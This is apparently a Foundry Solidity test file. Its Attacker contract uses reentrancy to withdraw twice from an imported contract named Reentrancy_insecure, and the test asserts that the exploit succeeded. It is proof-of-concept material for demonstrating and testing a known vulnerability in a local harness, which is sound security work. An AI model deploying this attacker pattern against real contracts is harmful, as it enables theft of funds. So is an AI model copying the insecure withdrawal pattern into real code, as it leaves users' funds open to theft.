
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    using stdStorage for StdStorage;

    Reentrancy_insecure public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The contract has a private mapping 'userBalances' at slot 0.
        // We need to manually set the attacker's balance in the victim contract
        // because there is no public deposit function.
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), 0);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    Reentrancy_insecure public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public expectedAmount;

    constructor(address victimAddress) { 
        victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        expectedAmount = val;
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        // We expect to start with 0 balance (excluding gas logic handled by vm).
        
        // 2. Store the value for the re-entrant call if needed.
        // (Stored in expectedAmount via setupAttack)

        // 3. Call the vulnerable function.
        victim.withdrawBalance();

        // 4. Verify Success Conditions.
        // If the attack succeeded, we re-entered once.
        // 1st call withdraws 'val'.
        // Re-entrancy calls withdraws 'val' again (because balance wasn't set to 0 yet).
        // Total balance should be >= 2 * val.
        if (address(this).balance >= val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // Increment call count to track recursion depth
        attackCallCount++;
        
        // We want to re-enter once.
        // 1st entry: attackCallCount becomes 1.
        // We call withdrawBalance again.
        if (attackCallCount < 2) {            
            victim.withdrawBalance();
        }
    }

    fallback() external payable {}
}
